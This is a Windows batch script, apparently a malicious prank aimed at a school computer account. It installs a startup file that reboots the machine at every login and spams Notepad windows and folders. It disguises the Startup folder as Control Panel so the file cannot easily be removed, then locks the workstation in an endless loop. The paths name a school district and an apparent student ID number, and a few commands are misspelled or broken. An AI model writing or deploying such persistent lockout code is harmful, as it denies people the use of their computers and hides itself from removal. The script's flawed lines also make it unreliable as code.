REM Creating a file with code
(
echo shutdown /r /t 0
echo set /a num=1
echo cd C:\Users\%username%\Desktop
echo cd C:\Users\%username%\OneDrive - Fairfax County Public Schools\Desktop
echo :a
echo start notepad /max
echo md LLLL_%%num%%
echo num=%%num%%+1
echo goto a
) > File.bat
REM Copying it to startup and then deleting the original
COPY "File.bat" "C:\Users\1651176\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
del File.bat /q
cd "C:\Users\1651176\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
ren Startup "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
atrrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
:Lock
rundll32.exe user32.dll, LockWorkStation
goto Lock
